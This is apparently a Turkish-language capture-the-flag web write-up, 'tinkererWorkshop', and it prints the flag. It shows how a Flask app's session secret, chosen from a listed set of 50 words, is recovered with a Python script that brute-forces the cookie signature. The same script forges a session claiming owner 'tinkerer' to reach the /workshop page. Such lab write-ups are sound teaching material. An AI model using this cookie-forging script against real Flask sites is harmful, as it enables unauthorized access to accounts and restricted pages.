# tinkererWorkshop - Web

flag: `SKYSEC{WH0_IS_THERE?}`

# Source Code
Kaynak koduna sahip olduğumuz için önce onu incelemekle başlayalım. Kodda gözümüze ilk çarpan şey cookie için secret keyin rastgele 50 kelimeden verildiği ve bizim ona sahip olmamız.

```
words = ["emission", "alliance", "offense", "scientist", "series", "counter", "depression", "emotion", "call",
         "correspondent", "salmon", "acceptance", "step", "pc", "leather", "ritual", "awareness", "cause", "hook",
         "breath", "wife", "ethics", "library", "cell", "excitement", "competitor", "text", "beat", "figure", "fighter",
         "relation", "critic", "revolution", "alarm", "opponent", "criticism", "humanity", "portion", "assessment",
         "tree", "background", "square", "anxiety", "teaspoon", "rating", "historian", "heights", "discrimination",
         "fiber", "officer"]
```

# Writeup
Ardından kodu inceledikten sonra workshop isminde bir subdomain görüyoruz ama girmek istediğimizde bize bir uyarı veriyor. Ardından kodun bu bloğunu incelediğimizde gözümüze bir şey çarpıyor

```python
    if session.get("owner"):
        check = session["owner"]
        if check == "tinkerer":
```
Ardından dilersek flask-unsign kullanarak dilersek de bu denemeyi yapacak python scripti yazarak secret key ile cookiemizi çözüp {'owner':'tinkerer'} olacak 
şekilde yeniden paketleyip yeni cookie ile sisteme giriş yapmamız gerekmektedir. 

# Python Script
```python
import flask
import hashlib

from sys import argv
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature

cookie = argv[1]

words = ["emission", "alliance", "offense", "scientist", "series", "counter", "depression", "emotion", "call",
         "correspondent", "salmon", "acceptance", "step", "pc", "leather", "ritual", "awareness", "cause", "hook",
         "breath", "wife", "ethics", "library", "cell", "excitement", "competitor", "text", "beat", "figure", "fighter",
         "relation", "critic", "revolution", "alarm", "opponent", "criticism", "humanity", "portion", "assessment",
         "tree", "background", "square", "anxiety", "teaspoon", "rating", "historian", "heights", "discrimination",
         "fiber", "officer"]

real_secret = ''

for secret in words:
    try:
        serializer = URLSafeTimedSerializer(
            secret_key=secret,  
            salt='cookie-session',
            serializer=TaggedJSONSerializer(),
            signer=TimestampSigner,
            signer_kwargs={
                'key_derivation' : 'hmac',
                'digest_method' : hashlib.sha1
        }).loads(cookie)
    except BadSignature:
        continue

    print(f'Secret key: {secret}')
    real_secret = secret

session = {'owner' : 'tinkerer'}

print(URLSafeTimedSerializer(
    secret_key=real_secret,
    salt='cookie-session',
    serializer=TaggedJSONSerializer(),
    signer=TimestampSigner,
    signer_kwargs={
        'key_derivation' : 'hmac',
        'digest_method' : hashlib.sha1
    }
).dumps(session))

```
# FLAG
Ardından yeni cookie ile /workshop dizinine giriş yaptığımızda Flag bizi karşılıyor
"SKYSEC{WH0_IS_THERE?}"